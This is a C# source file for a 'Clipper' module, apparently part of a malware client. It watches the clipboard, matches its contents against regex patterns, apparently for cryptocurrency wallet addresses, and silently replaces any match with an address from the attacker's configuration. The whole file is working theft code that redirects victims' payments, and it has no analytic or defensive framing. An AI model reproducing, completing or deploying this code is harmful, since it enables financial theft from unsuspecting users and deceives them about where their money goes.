using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using Client.Modules.Manager;

namespace Client.Modules.Clipper;

internal sealed class Clipper
{
	public static void Replace()
	{
		string clipboardText = ClipboardManager.ClipboardText;
		if (string.IsNullOrEmpty(clipboardText))
		{
			return;
		}
		foreach (KeyValuePair<string, Regex> patterns in RegexPatterns.PatternsList)
		{
			string key = patterns.Key;
			if (patterns.Value.Match(clipboardText).Success)
			{
				string text = Config.ClipperAddresses[key];
				if (!string.IsNullOrEmpty(text) && !clipboardText.Equals(text))
				{
					Clipboard.SetText(text);
					Console.WriteLine("Clipper replaced to " + text);
					break;
				}
			}
		}
	}
}
